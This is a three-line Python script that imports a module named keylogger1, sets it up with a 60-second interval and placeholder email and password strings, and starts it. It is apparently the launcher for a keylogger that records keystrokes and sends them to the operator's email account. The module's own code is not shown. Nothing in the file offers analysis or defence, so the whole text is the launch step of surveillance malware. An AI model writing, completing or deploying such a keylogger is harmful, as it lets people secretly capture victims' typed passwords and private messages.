import keylogger1
my_keylogger = keylogger1.Keylogger(60,"your email" , "your password ")  #set time
my_keylogger.start()